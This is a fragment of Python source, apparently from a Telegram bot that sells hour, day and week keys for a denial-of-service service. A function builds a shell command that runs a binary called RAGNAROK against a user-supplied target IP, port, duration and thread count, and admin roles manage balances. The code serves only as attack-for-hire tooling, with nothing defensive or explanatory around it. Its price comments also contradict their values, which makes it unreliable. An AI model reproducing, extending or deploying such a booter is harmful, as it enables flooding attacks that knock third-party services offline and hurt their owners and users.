...
KEY_PRICES = {
    'hour': 35,  # 10 Rs per hour
    'day': 150,   # 80 Rs per day
    'week': 500  # 350 Rs per week
}
...
async def run_attack_command_on_codespace(target_ip, target_port, duration, chat_id):
    ...
    try:
        ...
        if selected_binary == "Smokie":
            command = f"./RAGNAROK {target_ip} {target_port} {duration} {thread_count} "
        else:  # Smokie1
...
def send_welcome(message):
    ...
    if is_super_admin(user_id):
        welcome_message = (
            f"Welcome, Super Admin! To {_d(SAYYED_Z)}\n\n"
            f"Admin Commands:\n"
        ...
        balance = get_admin_balance(user_id)
        welcome_message = (
            f"Welcome, Admin! To {_d(SAYYED_Z)}\n\n"
        ...
        welcome_message = (
            f"Welcome, {username}! To {_d(SAYYED_Z)}\n\n"
